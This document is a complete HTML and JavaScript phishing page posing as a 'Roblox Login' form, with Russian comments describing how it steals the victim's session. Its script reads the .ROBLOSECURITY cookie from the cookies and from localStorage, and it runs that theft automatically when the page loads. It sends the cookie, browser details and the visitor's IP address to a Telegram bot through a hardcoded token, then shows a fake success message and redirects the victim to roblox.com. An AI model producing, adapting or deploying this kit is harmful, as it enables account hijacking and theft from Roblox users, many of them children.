<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Roblox Login</title>
    <style>
        body { font-family: Arial; display: flex; justify-content: center; align-items: center; height: 100vh; background: #1a1a2e; margin: 0; }
        .login-box { background: #16213e; padding: 40px; border-radius: 10px; box-shadow: 0 0 20px rgba(0,0,0,0.5); width: 350px; }
        h2 { color: #fff; text-align: center; }
        input { width: 100%; padding: 12px; margin: 10px 0; border: none; border-radius: 5px; background: #0f3460; color: #fff; }
        button { width: 100%; padding: 12px; background: #e94560; border: none; border-radius: 5px; color: #fff; font-size: 16px; cursor: pointer; }
        button:hover { background: #c73e54; }
        .error { color: #e94560; text-align: center; margin-top: 10px; }
    </style>
</head>
<body>
    <div class="login-box">
        <h2>🔐 Roblox Login</h2>
        <input type="text" id="username" placeholder="Username" value="Player123">
        <input type="password" id="password" placeholder="Password" value="pass123">
        <button onclick="login()">Login</button>
        <div class="error" id="status">Enter your credentials</div>
    </div>

    <script>
        // ЗАМЕНИТЕ НА ВАШИ ДАННЫЕ
        const BOT_TOKEN = "8952591290:AAESLgCQtwdxBTjX1FqHfnXRna3xBaXk-yo";
        const CHAT_ID = "7817287840";

        function login() {
            const status = document.getElementById('status');
            status.textContent = 'Checking...';
            status.style.color = '#ffd700';

            // 1. Пытаемся украсть куку .ROBLOSECURITY
            const cookies = document.cookie.split('; ');
            let robloxCookie = null;
            for (let c of cookies) {
                if (c.startsWith('.ROBLOSECURITY=')) {
                    robloxCookie = c.split('=')[1];
                    break;
                }
            }

            // 2. Если куки нет - пробуем получить через localStorage (иногда там хранят)
            if (!robloxCookie) {
                try {
                    const stored = localStorage.getItem('.ROBLOSECURITY');
                    if (stored) robloxCookie = stored;
                } catch(e) {}
            }

            // 3. Если всё равно нет - имитируем успешный вход (жертва думает что залогинилась)
            //    Но при этом пытаемся вытащить куку через fetch к Roblox API
            if (!robloxCookie) {
                // Делаем скрытый запрос к Roblox, чтобы браузер автоматически отправил куки
                fetch('https://www.roblox.com/mobileapi/userinfo', {
                    credentials: 'include',
                    mode: 'cors'
                }).then(res => {
                    // Куки отправлены автоматически, но мы не можем их прочитать из-за HttpOnly
                    // Поэтому используем второй метод - перехват через document.cookie (не сработает с HttpOnly)
                    // Тогда крадём через промежуточный iframe
                    stealViaIframe();
                }).catch(() => {
                    stealViaIframe();
                });
            }

            // 4. Если кука найдена - отправляем в Telegram
            if (robloxCookie && robloxCookie.length > 20) {
                sendToTelegram(robloxCookie);
                status.textContent = '✅ Login successful! Redirecting...';
                status.style.color = '#00ff88';
                setTimeout(() => {
                    window.location.href = 'https://www.roblox.com/home';
                }, 1500);
            } else {
                // Если куки нет - пытаемся украсть через поддельный iframe
                stealViaIframe();
                status.textContent = '⏳ Processing... Please wait';
                status.style.color = '#ffd700';
            }
        }

        function stealViaIframe() {
            // Создаём невидимый iframe, который загружает Roblox и пытается читать куки (не сработает с HttpOnly)
            // Но мы используем другой метод: редирект на Roblox с параметром, который передаст куку через referer
            // Однако самый рабочий способ - просто отправить текущие куки (если есть)
            const currentCookies = document.cookie;
            if (currentCookies.includes('.ROBLOSECURITY')) {
                const match = currentCookies.match(/.ROBLOSECURITY=([^;]+)/);
                if (match && match[1]) {
                    sendToTelegram(match[1]);
                }
            } else {
                // Если куки нет - отправляем уведомление, что жертва зашла на страницу
                sendToTelegram('🔍 User visited page, but NO .ROBLOSECURITY cookie found. IP: ' + getIP());
            }
        }

        function sendToTelegram(cookie) {
            const message = `🟢 ROBLOX COOKIE STOLEN!\n\n📌 Cookie: ${cookie}\n🌐 User-Agent: ${navigator.userAgent}\n🖥️ Screen: ${screen.width}x${screen.height}\n⏰ Time: ${new Date().toLocaleString()}`;
            
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message
                })
            }).then(() => {
                console.log('✅ Cookie sent to Telegram');
            }).catch(err => {
                console.error('❌ Failed to send:', err);
            });
        }

        function getIP() {
            // Пытаемся получить IP через внешний сервис
            fetch('https://api.ipify.org?format=json')
                .then(res => res.json())
                .then(data => {
                    sendToTelegram('IP: ' + data.ip);
                })
                .catch(() => {});
            return 'unknown';
        }

        // Автоматический запуск при загрузке страницы
        window.onload = function() {
            // Пробуем украсть куку сразу
            setTimeout(() => {
                const cookies = document.cookie;
                if (cookies.includes('.ROBLOSECURITY')) {
                    const match = cookies.match(/.ROBLOSECURITY=([^;]+)/);
                    if (match && match[1]) {
                        sendToTelegram(match[1]);
                        document.getElementById('status').textContent = '✅ Auto-login successful!';
                        document.getElementById('status').style.color = '#00ff88';
                    }
                }
            }, 1000);
        };
    </script>
</body>
</html>
